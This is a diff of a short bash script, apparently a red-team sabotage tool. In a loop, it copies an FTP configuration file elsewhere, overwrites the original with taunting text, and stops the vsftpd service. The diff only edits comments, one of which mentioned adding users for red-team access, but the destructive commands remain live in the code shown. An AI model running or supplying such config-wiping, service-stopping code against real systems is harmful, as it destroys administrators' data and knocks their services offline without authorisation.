@@ -9,14 +9,15 @@ do
  #Generate random number, check if the number is even or odd
  if [ $(( $RANDOM % 2)) -eq 0 ]
  then
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/ssl/ftpc/ftpc.conf' '/etc/mm.conf'
    echo "I'm Batman" > '/etc/ssl/ftpc/ftpc.conf'
  else
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/ssl/ftpc/ftpc.conf' '/home/mm.conf'
    echo "You ever dance with the devil in the pale mooon light?" > '/etc/ssl/ftpc/ftpc.conf'
  fi
- #Stop samba service
+ 
+ #Stop ftp service
  sudo service vsftpd stop
 done
